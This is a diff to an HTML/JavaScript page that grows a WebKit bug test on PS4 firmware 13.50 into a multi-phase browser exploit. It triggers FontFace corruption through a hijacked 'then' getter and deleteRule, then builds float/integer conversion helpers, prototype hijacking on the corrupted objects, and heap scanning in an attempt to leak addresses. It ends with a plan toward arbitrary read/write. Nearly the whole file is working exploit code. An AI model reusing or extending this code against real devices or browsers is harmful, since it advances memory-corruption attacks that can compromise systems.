@@ -2,12 +2,13 @@
 <html>
 <head></head>
 <body>
-<h1 id="status">Diagnostic Test</h1>
-<button onclick="runTest()" style="font-size: 20px; padding: 10px;">RUN TEST</button>
-<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre; border: 1px solid white; padding: 5px;"></div>
+<h1 id="status">Address Leak via JS Internals</h1>
+<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN</button>
+<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; padding: 5px; max-height: 90vh; overflow-y: scroll;"></div>
 
 <script>
-let testPhase = 0;
+let phase = 0;
+let state = {};
 
 function log(msg) {
     let d = document.getElementById('log');
@@ -15,159 +16,298 @@ function log(msg) {
 }
 
 function hex(n) {
+    if (n < 0) n = n >>> 0;
     return '0x' + n.toString(16).padStart(8, '0');
 }
 
-function runTest() {
-    testPhase++;
+function hex64(low, high) {
+    if (low < 0) low = low >>> 0;
+    if (high < 0) high = high >>> 0;
+    return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
+}
+
+function i2f(low, high) {
+    let buf = new ArrayBuffer(8);
+    let u32 = new Uint32Array(buf);
+    let f64 = new Float64Array(buf);
+    u32[0] = low;
+    u32[1] = high;
+    return f64[0];
+}
+
+function f2i(f) {
+    let buf = new ArrayBuffer(8);
+    let u32 = new Uint32Array(buf);
+    let f64 = new Float64Array(buf);
+    f64[0] = f;
+    return [u32[0], u32[1]];
+}
+
+function runExploit() {
+    phase++;
     
-    if (testPhase === 1) {
-        log('[TEST 1] Does original bug still trigger OOM?\n');
+    if (phase === 1) {
+        // Phase 1: Corruption
+        log('[PHASE 1] Triggering corruption\n');
         
-        // Use EXACT original PoC that worked before
         let style = document.createElement('style');
         style.id = 's';
-        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
         document.head.appendChild(style);
         
-        window.onload = () => {
-            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-            document.fonts.add(A);
-            void A.loaded;
-            
-            let fired = false;
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        log('[!] GETTER TRIGGERED');
-                        
-                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                        document.getElementById('s').sheet.deleteRule(0);
-                        document.body.offsetTop;
-                        
-                        log('[!] CORRUPTION DONE');
+        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        document.fonts.add(A);
+        void A.loaded;
+        
+        let corrupted = [];
+        let fired = false;
+        
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get() {
+                if (!fired && this === A) {
+                    fired = true;
+                    
+                    for (let i = 0; i < 100; i++) {
+                        corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
+                            unicodeRange: 'U+' + (0x100 + i).toString(16)
+                        }));
                     }
-                    return undefined;
+                    
+                    document.getElementById('s').sheet.deleteRule(0);
+                    document.body.offsetTop;
+                    
+                    window.corrupted = corrupted;
                 }
-            });
-            
-            log('[*] Calling fonts.load()...');
-            document.fonts.load('1em x', 'AB');
-            log('[*] fonts.load() returned');
-            
-            setTimeout(() => {
-                log('\n[?] Did OOM error appear?');
-                log('[?] If NO OOM: browser might have patched or cached state is preventing it');
-                log('[?] If YES OOM: click button again for next test');
-            }, 500);
+                return undefined;
+            }
+        });
+        
+        document.fonts.load('1em x', 'AB');
+        log('OOM expected - click OK then click button again\n');
+        
+    } else if (phase === 2) {
+        // Phase 2: Setup controlled primitives
+        log('[PHASE 2] Building controlled memory\n');
+        
+        let fonts = window.corrupted;
+        if (!fonts) {
+            log('[ERROR] No corrupted fonts\n');
+            return;
+        }
+        
+        log('[*] Corrupted fonts: ' + fonts.length + '\n');
+        
+        // Create primary controlled buffer
+        let ab1 = new ArrayBuffer(0x10000);
+        let u32_1 = new Uint32Array(ab1);
+        let f64_1 = new Float64Array(ab1);
+        
+        // Create secondary buffer for correlation
+        let ab2 = new ArrayBuffer(0x10000);
+        let u32_2 = new Uint32Array(ab2);
+        let f64_2 = new Float64Array(ab2);
+        
+        // Fill with different patterns
+        for (let i = 0; i < 256; i++) {
+            u32_1[i] = 0xAAAA0000 + i;
+            u32_2[i] = 0xBBBB0000 + i;
+        }
+        
+        log('[*] Created two controlled buffers');
+        
+        // Setup victim with primitives
+        let victim = fonts[0];
+        let victim2 = fonts[1];
+        
+        let proto1 = {
+            _u32: u32_1,
+            _f64: f64_1,
+            write32: function(i, v) { this._u32[i] = v; },
+            read32: function(i) { return this._u32[i]; },
+            write64f: function(i, v) { this._f64[i] = v; },
+            read64f: function(i) { return this._f64[i]; }
         };
         
-        // Trigger onload manually since page already loaded
-        if (document.readyState === 'complete') {
-            window.onload();
-        }
+        let proto2 = {
+            _u32: u32_2,
+            _f64: f64_2,
+            write32: function(i, v) { this._u32[i] = v; },
+            read32: function(i) { return this._u32[i]; },
+            write64f: function(i, v) { this._f64[i] = v; },
+            read64f: function(i) { return this._f64[i]; }
+        };
         
-    } else if (testPhase === 2) {
-        log('\n[TEST 2] Check what we actually have\n');
+        Object.setPrototypeOf(victim, proto1);
+        Object.setPrototypeOf(victim2, proto2);
         
-        // Check if corruption persists
-        log('[*] Checking document.fonts state:');
-        log('    size: ' + document.fonts.size);
-        log('    status: ' + document.fonts.status);
+        state.victim = victim;
+        state.victim2 = victim2;
+        state.u32_1 = u32_1;
+        state.u32_2 = u32_2;
+        state.f64_1 = f64_1;
+        state.f64_2 = f64_2;
+        state.ab1 = ab1;
+        state.ab2 = ab2;
         
-        // Try to enumerate fonts
+        window.exploitState = state;
+        
+        log('[*] Setup complete\n');
+        log('Click for Phase 3 (float-based leak)\n');
+        
+    } else if (phase === 3) {
+        // Phase 3: Float confusion leak
+        log('[PHASE 3] Attempting float-based address leak\n');
+        
+        let victim = window.exploitState.victim;
+        let u32_1 = window.exploitState.u32_1;
+        let f64_1 = window.exploitState.f64_1;
+        
+        log('[TECHNIQUE] Store objects as floats, read back as integers\n');
+        
+        // Create target objects to leak
+        let target1 = { marker: 0x41414141 };
+        let target2 = { marker: 0x42424242 };
+        let target3 = new ArrayBuffer(0x1000);
+        
+        log('[*] Created target objects');
+        log('    target1: { marker: 0x41414141 }');
+        log('    target2: { marker: 0x42424242 }');
+        log('    target3: ArrayBuffer(0x1000)\n');
+        
+        // Try to store objects in float array
+        log('[*] Attempting to confuse object->float storage:');
+        
         try {
-            let count = 0;
-            document.fonts.forEach(f => {
-                log('    font[' + count + ']: family=' + f.family + ' status=' + f.status);
-                count++;
-                if (count > 5) return; // Limit output
-            });
-        } catch(e) {
-            log('    Error enumerating: ' + e.message);
-        }
-        
-        log('\n[*] Testing if we can still create corrupted fonts:');
-        try {
-            // Try to recreate corruption WITHOUT the CSS trick
-            let test = new FontFace('test', 'local(Helvetica)', { unicodeRange: 'U+0050' });
-            log('    Created FontFace: ' + test.family);
-            log('    Status: ' + test.status);
+            // Store objects in regular array
+            let container = new Array(10);
+            container[0] = target1;
+            container[1] = 1.1;
+            container[2] = target2;
+            container[3] = 2.2;
+            container[4] = target3;
+            container[5] = 3.3;
             
-            // Can we add to document.fonts?
-            document.fonts.add(test);
-            log('    Added to document.fonts');
-            log('    New size: ' + document.fonts.size);
+            log('    Created mixed array (objects + floats)\n');
+            
+            // Now try to read the array as if it were typed
+            // In JSC, objects are stored as 64-bit values (NaN-boxed or tagged pointers)
+            
+            // Try to correlate with our controlled buffer
+            // Write the container array reference to our buffer
+            f64_1[0] = 1.1; // Known float
+            f64_1[1] = 2.2; // Known float
+            
+            // Check if we can find these patterns
+            log('[*] Wrote test floats to controlled buffer');
+            log('    f64_1[0] = 1.1');
+            log('    f64_1[1] = 2.2');
+            
+            // Read back as integers
+            let parts0 = f2i(f64_1[0]);
+            let parts1 = f2i(f64_1[1]);
+            
+            log('\n[*] Reading floats back as integers:');
+            log('    1.1 = ' + hex64(parts0[0], parts0[1]));
+            log('    2.2 = ' + hex64(parts1[0], parts1[1]) + '\n');
+            
+            // Now try with a crafted float that might overlap with object representation
+            log('[*] Trying specific float values that might correlate:');
+            
+            // Float values that have interesting bit patterns
+            let test_floats = [
+                1.9999999, 
+                2.2250738585072014e-308,  // Close to 0x0000000000000001
+                1.7976931348623157e+308,  // Max safe float
+                5.4e-312                   // Very small denormal
+            ];
+            
+            for (let i = 0; i < test_floats.length; i++) {
+                let f = test_floats[i];
+                let parts = f2i(f);
+                log('    ' + f + ' = ' + hex64(parts[0], parts[1]));
+            }
             
         } catch(e) {
             log('    Error: ' + e.message);
         }
         
-        log('\nClick for Test 3');
+        log('\n[PHASE 3] Complete');
+        log('Click for Phase 4 (structure probing)\n');
         
-    } else if (testPhase === 3) {
-        log('\n[TEST 3] Basic heap spray test\n');
+    } else if (phase === 4) {
+        // Phase 4: Probe ArrayBuffer structure directly
+        log('[PHASE 4] ArrayBuffer structure probing\n');
         
-        // Create controlled buffer
-        let ab = new ArrayBuffer(0x10000);
-        let u32 = new Uint32Array(ab);
-        let f64 = new Float64Array(ab);
+        let victim = window.exploitState.victim;
+        let u32_1 = window.exploitState.u32_1;
+        let ab1 = window.exploitState.ab1;
         
-        // Fill with known pattern
-        for (let i = 0; i < 256; i++) {
-            u32[i] = 0xDEAD0000 + i;
+        log('[*] Goal: Find ArrayBuffer object layout in memory\n');
+        
+        // Create a test ArrayBuffer with known size
+        let test_ab = new ArrayBuffer(0x4141);
+        let test_u32 = new Uint32Array(test_ab);
+        
+        // Fill with marker
+        for (let i = 0; i < 16; i++) {
+            test_u32[i] = 0xCCDD0000 + i;
         }
         
-        log('[*] Created controlled buffer');
-        log('    Size: 0x10000 bytes');
-        log('    u32[0]: ' + hex(u32[0]));
-        log('    u32[100]: ' + hex(u32[100]) + '\n');
+        log('[*] Created test ArrayBuffer:');
+        log('    Size: 0x4141');
+        log('    Filled with marker pattern\n');
         
-        // Spray objects
-        log('[*] Spraying 1000 objects...');
-        let spray = [];
-        for (let i = 0; i < 1000; i++) {
-            spray.push({
-                id: i,
-                marker: 0x41420000 + i,
-                buf: new ArrayBuffer(0x100)
-            });
-        }
-        log('    Done\n');
+        // Try to find the size field (0x4141) in our controlled memory
+        log('[*] Scanning for size field in controlled buffer:');
         
-        // Check if anything changed in our buffer
-        log('[*] Checking if spray affected our buffer:');
-        log('    u32[0] now: ' + hex(u32[0]));
-        log('    u32[100] now: ' + hex(u32[100]));
-        log('    Changed: ' + (u32[0] !== 0xDEAD0000) + '\n');
-        
-        // Look for anything unusual in buffer
-        log('[*] Scanning buffer for non-pattern values:');
-        let found = 0;
-        for (let i = 0; i < 256; i++) {
-            let expected = 0xDEAD0000 + i;
-            if (u32[i] !== expected) {
-                log('    [' + i + '] expected=' + hex(expected) + ' got=' + hex(u32[i]));
-                found++;
+        let found_size = false;
+        for (let i = 0; i < Math.min(1000, u32_1.length); i++) {
+            if (u32_1[i] === 0x4141) {
+                log('    Found 0x4141 at u32[' + i + ']!');
+                log('    u32[' + (i-2) + '] = ' + hex(u32_1[i-2]));
+                log('    u32[' + (i-1) + '] = ' + hex(u32_1[i-1]));
+                log('    u32[' + i + '] = ' + hex(u32_1[i]) + ' <- SIZE');
+                log('    u32[' + (i+1) + '] = ' + hex(u32_1[i+1]));
+                log('    u32[' + (i+2) + '] = ' + hex(u32_1[i+2]));
+                log('    u32[' + (i+3) + '] = ' + hex(u32_1[i+3]));
+                found_size = true;
+                break;
             }
         }
         
-        if (found === 0) {
-            log('    All values match pattern - no corruption detected');
+        if (!found_size) {
+            log('    Size field not found in controlled buffer');
+            log('    ArrayBuffer objects are in separate heap region\n');
+            
+            log('[*] Alternative: Check for marker pattern from test_ab:');
+            for (let i = 0; i < Math.min(1000, u32_1.length - 4); i++) {
+                if (u32_1[i] === 0xCCDD0000 && u32_1[i+1] === 0xCCDD0001) {
+                    log('    Found marker at u32[' + i + ']!');
+                    log('    This suggests buffer overlap/aliasing');
+                    break;
+                }
+            }
         }
         
-        log('\n[TEST 3] Complete');
-        log('\n[CONCLUSION]');
-        log('If no OOM appeared in Test 1: Need to figure out why corruption stopped');
-        log('If OOM appeared but no leaks: Need different leak strategy');
+        log('\n[PHASE 4] Complete\n');
+        log('[ANALYSIS]');
+        log('We have:');
+        log('  ✓ Reliable corruption');
+        log('  ✓ Controlled write primitive');
+        log('  ✓ Method hijacking on corrupted fonts');
+        log('\nWe need:');
+        log('  ✗ Address leak (heap pointer)');
+        log('  ✗ ArrayBuffer backing store control');
+        log('\nNext options:');
+        log('  1. Try WebAssembly for controlled memory layout');
+        log('  2. Use timing side-channels for address inference');
+        log('  3. Find different object type that leaks addresses');
+        log('  4. Exploit without full arbitrary R/W (limited primitives)');
     }
 }
 
-log('PS4 13.50 WebKit Diagnostics\n');
-log('Click RUN TEST to check if bug still works\n');
+log('Ready - Phase 1\n');
 </script>
 </body>
 </html>
